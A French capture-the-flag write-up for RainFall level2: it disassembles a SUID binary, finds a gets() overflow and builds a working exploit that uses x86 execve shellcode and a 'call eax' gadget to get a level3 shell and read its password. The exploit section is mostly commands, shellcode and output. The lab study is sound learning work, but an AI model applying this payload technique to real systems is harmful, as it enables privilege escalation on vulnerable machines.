## 1: Analyse

### A: C'est quoi mon binaire?


  ```shell
  # On se connecte si c'est pas déja fait via le level1
  $ ssh level2@127.0.0.1 -p 4242
        _____       _       ______    _ _
      |  __ \     (_)     |  ____|  | | |
      | |__) |__ _ _ _ __ | |__ __ _| | |
      |  _  /  _` | | '_ \|  __/ _` | | |
      | | \ \ (_| | | | | | | | (_| | | |
      |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                    Good luck & Have fun

      To start, ssh with level0/level0 on 10.0.2.15:4242

  # On rentre le password
  level2@127.0.0.1's password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
    GCC stack protector support:            Enabled
    Strict user copy checks:                Disabled
    Restrict /dev/mem access:               Enabled
    Restrict /dev/kmem access:              Enabled
    grsecurity / PaX: No GRKERNSEC
    Kernel Heap Hardening: No KERNHEAP
  System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
  level2@RainFall:~$
  
  # On regarde ce qu'on a
  level2@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
    -rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
    -rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile

  # On teste les arguments
  level2@RainFall:~$ ./level2
    gfdhgkj
    gfdhgkj
  level2@RainFall:~$ ./level2
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
    Segmentation fault (core dumped)
  ```
  * On a un binaire appartenant a level3 dans le home avec les droits SUID...
  * ... qui demande un input ...
  * ... qui print l'input jsuqu'a un certain nombre de characteres ...
  * ... qui segfault avec un input trop long


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level2@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level2@RainFall:/tmp$ gdb ~/level2
      [...]
      Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info function
      All defined functions:

      Non-debugging symbols:
      0x08048358  _init
      0x080483a0  printf
      0x080483a0  printf@plt
      0x080483b0  fflush
      0x080483b0  fflush@plt
      0x080483c0  gets
      0x080483c0  gets@plt
      0x080483d0  _exit
      0x080483d0  _exit@plt
      0x080483e0  strdup
      0x080483e0  strdup@plt
      0x080483f0  puts
      0x080483f0  puts@plt
      0x08048400  __gmon_start__
      0x08048400  __gmon_start__@plt
      0x08048410  __libc_start_main
      0x08048410  __libc_start_main@plt
      0x08048420  _start
      0x08048450  __do_global_dtors_aux
      0x080484b0  frame_dummy # Une fonction frame_dummy
      0x080484d4  p           # Une fonction p
      0x0804853f  main        # Une fonction main
      0x08048550  __libc_csu_init
      0x080485c0  __libc_csu_fini
      0x080485c2  __i686.get_pc_thunk.bx
      0x080485d0  __do_global_ctors_aux
      0x080485fc  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x8049860
      0x8049860 <stdout@@GLIBC_2.0>:	 ""

    gdb-peda$ x/s 0x8048620
      0x8048620:	 "(%p)\n"
    
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # As usual, initialisation, alignement. On n'aloue cependant pas
      0x0804853f <+0>:	push   ebp            # On stocke le begin pointer
      0x08048540 <+1>:	mov    ebp,esp        # On rebouge ebp au debut de la zone buffer
      0x08048542 <+3>:	and    esp,0xfffffff0 # On applique un masque sur esp pour aligner la mémoire

      # On call directement p sans arguments
      0x08048545 <+6>:	call   0x80484d4 <p>

      # On return la fonction
      0x0804854a <+11>:	leave
      0x0804854b <+12>:	ret
      End of assembler dump.
  ```

  * Ok, donc on a un main qui call p et return. Regardons p.
  ```shell
    gdb-peda$ pdisas p
      Dump of assembler code for function p:
      # Comme d'habitude, on initialise et on alloue 104 octets.
      0x080484d4 <+0>:	push   ebp      # Bon on commence a comprendre, voir exos disas precedents
      0x080484d5 <+1>:	mov    ebp,esp
      0x080484d7 <+3>:	sub    esp,0x68 # On alloue 104 octets

      # Call fflush(stdout)
      0x080484da <+6>:	mov    eax,ds:0x8049860       # On stocke le datasegment 0x8049860 (stdout) dans eax
      0x080484df <+11>:	mov    DWORD PTR [esp],eax    # On push eax (stdout) sur la stack
      0x080484e2 <+14>:	call   0x80483b0 <fflush@plt> # On call fflush avec stdout

      # Call gets(buffer[76 - 12]): voir p+33, on met autre chose que l'input dans EBP -12
      0x080484e7 <+19>:	lea    eax,[ebp-0x4c]         # On met l'addresse EBP - 76 dans eax
      0x080484ea <+22>:	mov    DWORD PTR [esp],eax    # On push eax (EPB - 76) sur la stack
      0x080484ed <+25>:	call   0x80483c0 <gets@plt>   # On call gets avec EBP - 76

      # Jump to p+83 isi EIP n'est pas une addresse de la stack
      0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]  # On met l'addresse ebp + 4 (EIP) dans eax
      0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax  # On stocke cet eax (EIP) dans EBP - 12
      0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]  # On met la valeur de l'EIP dans eax
      0x080484fb <+39>:	and    eax,0xb0000000           # On applique un masque binaire sur eax...
      0x08048500 <+44>:	cmp    eax,0xb0000000           # ... pour vérifier si c'est une addresse de la stack
      0x08048505 <+49>:	jne    0x8048527 <p+83>         # Si ce n'est pas le cas on va a la ligne p+83

      # Si EIP est dans la stack, call printf("(%p)\n", EIP) et exit(1)
      0x08048507 <+51>:	mov    eax,0x8048620            # On met "(%p)\n" dans eax
      0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]  # On met la valeur a l'addresse EBP - 12 (EIP) dans edx
      0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx  # On push edx (EIP) sur la stack
      0x08048513 <+63>:	mov    DWORD PTR [esp],eax      # On push eax "(%p)\n" sur la stack
      0x08048516 <+66>:	call   0x80483a0 <printf@plt>   # On call printf avec les arguments
      0x0804851b <+71>:	mov    DWORD PTR [esp],0x1      # On push 1 sur la stack
      0x08048522 <+78>:	call   0x80483d0 <_exit@plt>    # On call exit

      # Si EIP n'est pas dans la stack (Jump depuis p+49), call puts(buffer[64])
      0x08048527 <+83>:	lea    eax,[ebp-0x4c]           # On met EBP - 76 (buffer rempli par gets) dans eax
      0x0804852a <+86>:	mov    DWORD PTR [esp],eax      # On push EBP - 76 (buffer rempli par gets) sur la stack
      0x0804852d <+89>:	call   0x80483f0 <puts@plt>     # On call puts

      # Call strdup(buffer[64])
      0x08048532 <+94>:	lea    eax,[ebp-0x4c]           # On met l'addresse EBP - 76 (buffer[64]) dans eax
      0x08048535 <+97>:	mov    DWORD PTR [esp],eax      # On push EBP - 76 (buffer[64]) sur la stack
      0x08048538 <+100>:	call   0x80483e0 <strdup@plt> # On call strdup. Le retour est implicitement stocké dans eax

      # Return
      0x0804853d <+105>:	leave
      0x0804853e <+106>:	ret
      End of assembler dump.
  ```

  * On voit que p prend un input et check que l'on n'aie pas bougé l'EIP sur une addresse de la stack.
  * Si EIP est sur la stack, on la print et on exit.
  * Sinon, on print l'input et on return strdup(buffer).

  * Bon, on a un strdup pour réécrire sur l'EIP, le gets est bien protégé POUR LES ADDRESSES DANS LA STACK. Mais c'est en soi la même vulnérabilité que précédement. Regardons frame_dummy.

  ```shell
    gdb-peda$ pdisas frame_dummy
      Dump of assembler code for function frame_dummy:
      # Passons l'interprétation des lignes pour se concentrer sur celle-la:
      [...]
      0x080484cf <+31>:	call   eax
      [...]
      End of assembler dump.
  ```

  * On voit un call EAX. Parfait on a tout ce qu'il faut pour voir à quoi ça va nous servir dans l'exploit.

## 2: Comportement
> Une fois recomposé, on comprend que le main call juste p.\
> p, quand à elle, fait un gets (faaaaaille) et check que l'addresse de EIP n'a pas été réécrite pour une addresse DE LA STACK. Or, on s'en fout on veut pas pointer sur la stack puisque:\
> frame_dummy va faire un call eax (entre autres choses dont on n'a foutrement pas besoin).


## 3: Exploit

### A: Explication

> On ne va pas refaire l'explication sur chaque exercice, on va faire des cf. level1 par exemple.\
> La particularité de cet exercice est que l'on va se servir d'un SHELLCODE.\
> Un shellcode est une instruction lançant un shell encodée dans une string d'input. Si on la call, BIM un shell s'ouvre.\
> Notre input va donc réécrire l'EIP (cf level1), mais:
>- A la place des random chars de padding, on va mettre le shellcode
>- On ne va pas mettre directement l'addresse du shellcode dans l'EIP puisque le programme exit si on pointe sur la stack, et notre input sera stocké dans la stack.
>- A la place on va mettre dans EIP l'addresse de l'instruction frame_dummy+31, call EAX (comme dans level1 on a mis l'addresse de run+0).\
> Vu que le strdup final de p va copier directement notre input dans un malloc dont il va passer l'addresse a eax, l'instruction executée par frame_dummy+31 sera le shellcode.

### B: Creation de l'exploit

* Il nous faut donc: l'adresse de l'instruction frame_dummy+31, à partir de combien de caractères (offset) on va réécrire sur l'EIP, et un shellcode

```shell
  # Addresse frame_dummy+31: 0x080484cf
  gdb-peda$ pdisas frame_dummy
    [...]
    0x080484cf <+31>:	call   eax
    [...]

  # On crée un pattern avec peda (générateur de patterns aussi trouvable sur internet)
  gdb-peda$ pattern create 200 pattern2
    Writing pattern of 200 chars to filename "pattern2"
  
  # On le cat pour le copier
  gdb-peda$ cat pattern2
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

  # On lance la fonction et on colle le pattern
  gdb-peda$ run
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

    # BIM segfault
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    [...]
    # Ici la portion du pattern qui a écrit sur l'EIP
    EIP: 0x41414a41 ('AJAA')
    [...]
    [-------------------------------------code-------------------------------------]
    # Ici la confirmation que le segfault est dû à une mauvaise addresse
    Invalid $PC address: 0x41414a41
    [------------------------------------stack-------------------------------------]
    # Ici la stack en partant des addresses basses. On voit notre string écrite
    0000| 0xbffff710 ("fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0004| 0xbffff714 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0008| 0xbffff718 ("AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0012| 0xbffff71c ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0016| 0xbffff720 ("AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0020| 0xbffff724 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0024| 0xbffff728 ("MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    0028| 0xbffff72c ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
    [------------------------------------------------------------------------------]
    Stopped reason: SIGSEGV
    0x41414a41 in ?? ()
  
  # Plutôt que de compter à la main combien de chars il faut imprimer avant l'addresse de call eax on va le faire calculer par peda
  gdb-peda$ pattern search
    [...]
    Registers contain pattern buffer:
    # On l'a ! Il faut écrire 80 - len(shellcode) random chars avant l'addresse du call eax
    EIP+0 found at offset: 80
    # Comme on peut s'y attendre EBP se trouve 4 octets avant EIP
    EBP+0 found at offset: 76
    [...]

  # Ensuite, le shellcode
  gdb-peda$ shellcode generate x86/linux exec
  # x86/linux/exec: 24 bytes
  shellcode = (
      "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
      "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
  # Si on met bout à bout ça fait pour une longueur de 24:       "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)
```

* On a donc tous les prérequis. En transformant en little indian l'addresse du call eax(\xcf\x84\x04\x08), on va pouvoir construire la string suivante:

```shell
  level2@RainFall:/tmp$ python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "A" * (80 - 24) + "\xcf\x84\x04\x08"' > pattern2
```

```shell
level2@RainFall:/tmp$ cat /tmp/pattern2 - | ~/level2
  1�Ph//shh/bin��1ɉ�j
                   X̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAτ
whoami
  level3
cat /home/user/level3/.pass
  492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
# CTRL D
level2@RainFall:/tmp$ su level3
  Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
level3@RainFall:~$
```